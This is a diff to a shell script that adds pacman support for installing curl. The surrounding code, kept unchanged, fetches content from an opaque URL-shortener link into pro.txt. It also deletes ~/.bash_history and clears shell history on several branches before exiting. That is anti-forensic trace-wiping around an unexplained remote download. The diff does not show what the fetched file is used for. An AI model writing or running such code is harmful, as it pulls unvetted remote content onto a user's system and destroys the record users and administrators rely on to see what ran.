@@ -6,9 +6,15 @@ else
     rm -f ~/.bash_history && history -c
     exit
 fi
+
 if ! command -v curl &> /dev/null; then
-    sudo apt install -y curl
+    if [ -f /etc/arch-release ]; then
+        sudo pacman -Sy --noconfirm curl
+    else
+        sudo apt install -y curl
+    fi
 fi
+
 if curl -fsSL v.gd/se19pro >> pro.txt; then
     echo "Command executed successfully."
 else
@@ -23,6 +29,5 @@ else
     fi
 fi
 
-# Clear bash history and exit
 rm -f ~/.bash_history && history -c
 exit
